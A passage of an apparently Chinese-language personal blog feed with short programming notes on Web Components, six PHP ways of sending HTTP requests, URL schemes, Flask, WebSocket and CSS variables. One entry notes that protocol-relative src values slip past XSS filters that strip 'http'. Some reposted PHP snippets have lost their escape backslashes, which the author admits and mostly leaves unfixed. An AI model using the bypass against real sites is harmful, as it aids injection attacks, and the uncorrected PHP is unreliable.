        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>
            (function() {
                var objectPrototype = Object.create(HTMLElement.prototype);
                objectPrototype.createdCallback = function() {
                    var shadow = this.createShadowRoot(),
                        templateContent = document.querySelector('#headerTemplate').content;
                    var templateNodes = document.importNode(templateContent, true);
                    shadow.appendChild(templateNodes); // 成功挂载,要累死我了
                };
                window.setTimeout(function() {
                    document.registerElement('header-element', {
                        prototype: objectPrototype
                    }) //延时注册
                }, 3000);
            })();
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header-element</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span>Web Component<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header-element</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>心都碎了,说好的</p>
<pre><code>:host::shadow h1{
    color:orange;
}
:host::content b{
    color:blue;
}
</code></pre><p>这样子.应该是<code>Hello</code>橙色,<code>web Component</code>蓝色啊<br>实际上运行结果是<br>firefox跑不出来<br>chrome上有加载效果,但加载出来都是橙色的,并且警告我</p>
<pre><code>::shadow pseudo-element is deprecated. See https://www.chromestatus.com/features/6750456638341120 for more details.
</code></pre></blockquote>
<h2 id="后来"><a href="#后来" class="headerlink" title="后来"></a>后来</h2><p>书的后几章讲了一些具体的实现组件化web的库<br>有<code>Polymer JS</code>, <code>Mozilla Brick</code>, <code>Bosonic</code>, <code>ReactJS</code></p>
<p>喔,,以后学一下<code>ReactJS</code>,稍微看了下,总感觉像是在拼接字符串</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/w3c/webcomponents" target="_blank" rel="external">https://github.com/w3c/webcomponents</a><br><a href="http://w3c.github.io/webcomponents/spec/shadow/" target="_blank" rel="external">http://w3c.github.io/webcomponents/spec/shadow/</a><br><a href="https://www.toobug.net/article/what_is_shadow_dom.html" target="_blank" rel="external">https://www.toobug.net/article/what_is_shadow_dom.html</a><br><a href="https://developer.mozilla.org/zh-cn/docs/web/web_components" target="_blank" rel="external">https://developer.mozilla.org/zh-cn/docs/web/web_components</a></p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[php发http请求]]></title>
      <url>/2017/05/25/php%E5%8F%91http%E8%AF%B7%E6%B1%82/</url>
      <content type="html"><![CDATA[<p>喔,突然想到,php如何发送http请求,好吧,好蠢啊<br>因为一直感觉php更像是专门的server<br>不像是py和node那样,很中</p>
<p>然后转载一波来自网络的内容,这个被转了很多次,我也不知道来源哪里了</p>
<h2 id="神tm六中方法"><a href="#神tm六中方法" class="headerlink" title="神tm六中方法"></a>神tm六中方法</h2><p>方法1: 用file_get_contents 以get方式获取内容：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$url</span><span class="token operator">=</span>'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.jb51.net/';</span>
<span class="token variable">$html</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$html</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>方法2: 用fopen打开url, 以get方式获取内容：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">stream_get_meta_data</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token variable">$result</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">echo</span> <span class="token string">"url body: $result"</span><span class="token punctuation">;</span>
<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>方法3：用file_get_contents函数,以post方式获取url</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword">array</span> <span class="token punctuation">(</span><span class="token string">'foo'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'bar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">http_build_query</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$opts</span> <span class="token operator">=</span> <span class="token keyword">array</span> <span class="token punctuation">(</span>
    <span class="token string">'http'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">array</span> <span class="token punctuation">(</span>
    <span class="token string">'method'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
    <span class="token string">'header'</span><span class="token operator">=</span><span class="token operator">></span> <span class="token string">"Content-type: application/x-www-form-urlencodedrn"</span><span class="token punctuation">.</span><span class="token string">"Content-Length: "</span><span class="token punctuation">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"rn"</span><span class="token punctuation">,</span>
    <span class="token string">'content'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$data</span>
    <span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$context</span> <span class="token operator">=</span> <span class="token function">stream_context_create</span><span class="token punctuation">(</span><span class="token variable">$opts</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$html</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//localhost/e/admin/test.html', false, $context);</span>

<span class="token keyword">echo</span> <span class="token variable">$html</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>方法4：用fsockopen函数打开url，以get方式获取完整的数据，包括header和body,fsockopen需要 PHP.ini 中 allow_url_fopen 选项开启</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function">get_url</span> <span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span><span class="token variable">$cookie</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token variable">$url</span><span class="token punctuation">[</span>path<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"?"</span><span class="token punctuation">.</span><span class="token variable">$url</span><span class="token punctuation">[</span>query<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string">"Query:"</span><span class="token punctuation">.</span><span class="token variable">$query</span><span class="token punctuation">;</span>
<span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span> <span class="token variable">$url</span><span class="token punctuation">[</span>host<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">[</span>port<span class="token punctuation">]</span><span class="token operator">?</span><span class="token variable">$url</span><span class="token punctuation">[</span>port<span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token number">80</span> <span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
<span class="token variable">$request</span> <span class="token operator">=</span> <span class="token string">"GET $query HTTP/1.1\r\n"</span><span class="token punctuation">;</span>
<span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"Host: $url[host]\r\n"</span><span class="token punctuation">;</span>
<span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"Connection: Close\r\n"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span> <span class="token variable">$request</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token string">"Cookie:  $cookie\r\n"</span><span class="token punctuation">;</span>
<span class="token variable">$request</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token string">"\r\n"</span><span class="token punctuation">;</span>
<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token variable">$result</span> <span class="token punctuation">.</span><span class="token operator">=</span> @<span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">//获取url的html部分，去掉header</span>
<span class="token keyword">function</span> <span class="token function">GetUrlHTML</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span><span class="token variable">$cookie</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token variable">$rowdata</span> <span class="token operator">=</span> <span class="token function">get_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span><span class="token variable">$cookie</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$rowdata</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token variable">$body</span><span class="token operator">=</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$rowdata</span><span class="token punctuation">,</span><span class="token string">"rnrn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$body</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token variable">$body</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我绝对不会用这种超级长的</p>
<p>方法5：用fsockopen函数打开url，以POST方式获取完整的数据，包括header和body</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function">HTTP_Post</span><span class="token punctuation">(</span><span class="token variable">$URL</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token variable">$cookie</span><span class="token punctuation">,</span> <span class="token variable">$referrer</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>

<span class="token comment" spellcheck="true">// parsing the given URL</span>
<span class="token variable">$URL_Info</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$URL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// Building referrer</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$referrer</span><span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// if not given use this script as referrer</span>
    <span class="token variable">$referrer</span><span class="token operator">=</span><span class="token string">"111"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">// making string from $data</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$value</span><span class="token punctuation">)</span>
<span class="token variable">$values</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"$key="</span><span class="token punctuation">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$data_string</span><span class="token operator">=</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">,</span><span class="token variable">$values</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// Find out which port is needed – if not given use standard (=80)</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$URL_Info</span><span class="token punctuation">[</span><span class="token string">"port"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token variable">$URL_Info</span><span class="token punctuation">[</span><span class="token string">"port"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// building POST-request:</span>
<span class="token variable">$request</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token string">"POST "</span><span class="token punctuation">.</span><span class="token variable">$URL_Info</span><span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">" HTTP/1.1\n"</span><span class="token punctuation">;</span>
<span class="token variable">$request</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token string">"Host: "</span><span class="token punctuation">.</span><span class="token variable">$URL_Info</span><span class="token punctuation">[</span><span class="token string">"host"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>
<span class="token variable">$request</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token string">"Referer: "</span><span class="token punctuation">.</span><span class="token string">"$referer\n"</span><span class="token punctuation">;</span>
<span class="token variable">$request</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token string">"Content-type: "</span><span class="token punctuation">.</span><span class="token string">"application/x-www-form-urlencoded\n"</span><span class="token punctuation">;</span>
<span class="token variable">$request</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token string">"Content-length: "</span><span class="token punctuation">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data_string</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>
<span class="token variable">$request</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token string">"Connection: "</span><span class="token punctuation">.</span><span class="token string">"close\n"</span><span class="token punctuation">;</span>

<span class="token variable">$request</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token string">"Cookie:  $cookie\n"</span><span class="token punctuation">;</span>

<span class="token variable">$request</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token string">"\n"</span><span class="token punctuation">;</span>
<span class="token variable">$request</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$data_string</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>

<span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$URL_Info</span><span class="token punctuation">[</span><span class="token string">"host"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$URL_Info</span><span class="token punctuation">[</span><span class="token string">"port"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fputs</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token variable">$result</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token delimiter">?></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>方法6:使用curl库，使用curl库之前，可能需要查看一下php.ini是否已经打开了curl扩展</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$timeout</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span> <span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.jb51.net/');</span>
<span class="token function">curl_setopt</span> <span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span> <span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_CONNECTTIMEOUT</span><span class="token punctuation">,</span> <span class="token variable">$timeout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file_contents</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token variable">$file_contents</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>恕我直言,,,还是file_get_contents比较靠谱<br>还有你们转载的时候就没有发现,,,,<code>\n</code>和<code>\r</code>都丢了<code>\\</code><br>改掉好多,懒得改了,应该都是\r\n吧后边的,,蒸米都是只有\n,感觉然后还要改</p>
</blockquote>
<h2 id="然后想"><a href="#然后想" class="headerlink" title="然后想"></a>然后想</h2><p>node里有<code>request</code>包 =&gt; <a href="https://github.com/request/request" target="_blank" rel="external">https://github.com/request/request</a><br>py里有<code>requests</code>库 =&gt; <a href="https://github.com/kennethreitz/requests" target="_blank" rel="external">https://github.com/kennethreitz/requests</a></p>
<p>然后上gayhub上搜了一下,诶?php也有一个<br><a href="https://github.com/rmccue/Requests" target="_blank" rel="external">https://github.com/rmccue/Requests</a></p>
<p>然后看下<br>好了.再看,再催我就要亲亲抱抱举高高了</p>
]]></content>
      
        
        <tags>
            
            <tag> php </tag>
            
            <tag> request </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[url]]></title>
      <url>/2017/05/25/url/</url>
      <content type="html"><![CDATA[<p>额,这个标题起得不好</p>
<p>因为有的时候src标签会过滤掉<code>http</code>,就是xss里写<code>src=&#39;http://&#39;</code>会被咔嚓<br>然后就是发现其实只要写<code>src=//xxx.cn</code>这样子就可以了</p>
<blockquote>
<p>咦,我不记得直接写<code>src=xxx.cn</code>可以不</p>
</blockquote>
<p>所以今天随手在浏览器地址栏里多敲了<code>//</code><br>就是敲了个<code>//www.qq.com</code><br>然后发现并不是像前面跳到<code>http://www.qq.com</code><br>而是跳到了<code>file:////www.qq.com</code></p>
<p>同样的<code>/www.qq.com</code>会跳到<code>file:///www.qq.com</code><br>只有<code>www.qq.com</code>可以跳到<code>http://www.qq.com</code></p>
<blockquote>
<p>还有个问题就是如果是如果是https会怎样子的</p>
</blockquote>
<p>先把问题记下来<br>先看完手头这本书后换掉,日后再补</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Flask学习]]></title>
      <url>/2017/05/23/Flask%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p>我一定要学会用Flask!</p>
<p>算了算了无法入门</p>
<p>只是学会了router,后面的不想学了</p>
<p>我还是用<code>node+express+handlebars</code>好了</p>
<p>只是想用FLask做一个api服务器,一端连app,一端连某个服务器,<br>然后从某服务器爬取数据处理一下,返回给APP<br>额,大概是<code>Flask+requests+beautifulSoup</code></p>
<p>不想渲染来渲染去,还不如用我熟悉的js</p>
<p>反正我咸鱼一条</p>
<p>所以我放弃了Flask的学习,哈哈哈哈,快乐咸鱼每一天</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[websocket]]></title>
      <url>/2017/05/23/websocket/</url>
      <content type="html"><![CDATA[<p>前几天做ctf的时候有一道题目叫弹幕<br>是一道socket的题目<br>想学一下socket</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/socketio/socket.io/" target="_blank" rel="external">https://github.com/socketio/socket.io/</a> (socket.io 2.0 都出来了…)<br><a href="https://github.com/joewalnes/websocketd" target="_blank" rel="external">https://github.com/joewalnes/websocketd</a> (Turn any program that uses STDIN/STDOUT into a WebSocket server)<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/WebSocket" target="_blank" rel="external">https://developer.mozilla.org/zh-CN/docs/Web/API/WebSocket</a> (MDN websocket)<br><a href="http://www.ruanyifeng.com/blog/2017/05/websocket.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2017/05/websocket.html</a> (ruanyifeng)</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[CSS变量]]></title>
      <url>/2017/05/23/CSS%E5%8F%98%E9%87%8F/</url>
      <content type="html"><![CDATA[<p>天啦噜</p>
<h2 id="CSS支持变量了"><a href="#CSS支持变量了" class="headerlink" title="CSS支持变量了"></a>CSS支持变量了</h2><pre class="line-numbers language-css"><code class="language-css"><span class="token selector"><span class="token class">.foo</span> </span><span class="token punctuation">{</span>
  <span class="token property">--foo</span><span class="token punctuation">:</span> <span class="token number">20</span>px<span class="token punctuation">;</span>
  <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--foo<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>大概来说就是</p>
<pre><code>-- 用来定义变量
var() 用来读变量值(只能作为属性值,不能作为属性名)
calc() 用来计算
</code></pre><p>具体参考MDN</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Using_CSS_variables" target="_blank" rel="external">https://developer.mozilla.org/en-US/docs/Web/CSS/Using_CSS_variables</a></p>
]]></content>
      
        
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Javascript DOM编程艺术笔记]]></title>
      <url>/2017/05/23/Javascript-DOM%E7%BC%96%E7%A8%8B%E8%89%BA%E6%9C%AF%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h2 id="addLoadEvent-p83"><a href="#addLoadEvent-p83" class="headerlink" title="addLoadEvent [p83]"></a>addLoadEvent [p83]</h2><p>可以用于添加n个函数到onload后执行</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">addLoadEvent</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> oldLoad <span class="token operator">=</span> window<span class="token punctuation">.</span>onload<span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> window<span class="token punctuation">.</span>onload <span class="token operator">!=</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        window<span class="token punctuation">.</span>onload <span class="token operator">=</span> func<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        window<span class="token punctuation">.</span>onload <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">oldLoad</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="p87"><a href="#p87" class="headerlink" title="[p87]"></a>[p87]</h2><p>几个知识点</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">showPic</span><span class="token punctuation">(</span>whichpic<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'placeholder'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> source <span class="token operator">=</span> whichpic<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">'href'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
